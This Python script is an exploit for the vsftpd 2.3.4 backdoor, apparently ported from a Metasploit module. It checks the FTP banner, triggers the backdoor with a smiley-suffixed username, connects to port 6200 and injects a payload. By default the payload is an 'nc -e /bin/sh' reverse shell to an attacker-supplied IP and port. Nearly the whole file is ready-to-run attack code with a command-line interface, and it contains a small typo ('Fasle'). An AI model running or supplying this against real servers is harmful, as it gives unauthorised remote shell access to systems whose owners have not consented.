import argparse
import re
import socket
import sys



#This function is use to verified ftp version
def check_service_version(conn: socket.socket) -> bool:
    #Chech the FTP service version to make sure it is vulnerable
    print('Verified ftp service version.')
    banner_data = conn.recv(1024)
    banner = banner_data.decode().strip()
    print('Banner: {}'.format(banner))
    #Chech to make sure this is running vsftpd v2.3.4
    if banner.lower() != '220 (vsftpd 2.3.4)':
        return False
    return True

#Send parameter to ftp server 
def open_backdoor(conn: socket.socket) -> bool:
    print('Openning backdoor.')
    sent_bytes = conn.send('USER anonymous:)\r\n'.encode())
    response = conn.recv(1024)
    passwd_response = response.decode().strip()
    passwd_response_code = int(passwd_response.split()[0])
    if passwd_response_code != 331:
        return Fasle
    sent_bytes = conn.send('PASS \r\n'.encode())
    return True

#Inject payload into the backdoor connection
def inject_payload(conn: socket.socket, payload) -> bool:
    print('Injecting payload via backdoor.')
    sent_bytes = conn.send('id\n'.encode())
    response = conn.recv(1024)
    uid_data = response.decode().strip()
    if re.search(r'^uid=', uid_data):
        uid = uid_data.split('(')[1].split(')')[0]
        print('GOt shell as user {} !'.format(uid))

        print('Injecting and running payload')
        sent_bytes = conn.send('nohup {} >/dev/null 2>&1\n'.format(payload).encode())
        return True
    else:
        print(uid_data)
        return False


def init_tcp_conn(target: str, port: int) -> socket.socket:
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect((target, port))
    return conn

#Create an ftp connection to the specified target
def init_ftp_conn(target: str) -> socket.socket:
    return init_tcp_conn(target, 21)


#Create a backdoor connection to the specified target
def init_backdoor_conn(target: str) -> socket.socket:
    return init_tcp_conn(target, 6200)


def main():
    parser = argparse.ArgumentParser(description='A python script of the metasploit exploit')
    parser.add_argument('-i', '--inject', help='Inject payload successful to exploit')
    parser.add_argument('-r', '--revshell-ip', help='Target IP for reverse shell to connect')
    parser.add_argument('-p', '--revshell-port', default=4444,help='Target port for reverse shell to connect')
    parser.add_argument('target_host', help='Target for exploit')

    args = parser.parse_args()

    #initialize variables
    target = args.target_host
    revshell_ip = args.revshell_ip
    revshell_port = int(args.revshell_port)
    payload = args.inject

    if not payload and not revshell_ip:
        print('ERROR: Must define a reverse shell target IP or custom payload ')
        sys.exit(1)
    if not payload:
        payload = 'nc -e /bin/sh {} {}'.format(revshell_ip, revshell_port)

    #initialize connection to FTP server
    conn = init_ftp_conn(target)

    #verify that this server is vulnerable to exploit
    if not check_service_version(conn):
        print('ERROR: this is not a vsftpd server on version 2.3.4')
        sys.exit(100)
    #Verified server is vulnerable 
    if not open_backdoor(conn):
        print('ERROR: The server did not respond as expected')
        sys.exit(101)

    #backdoor shoul now be open
    backdoor_conn = init_backdoor_conn (target)

    #try to inject the payload
    if  inject_payload(backdoor_conn, payload):
        print('Exploit successful !')
    else:
        print('ERROR: Did not gain shell.')

    #clean up
    print('Closing connections to server.')
    backdoor_conn.close()
    conn.close()
    print('Exploit complete')

main()
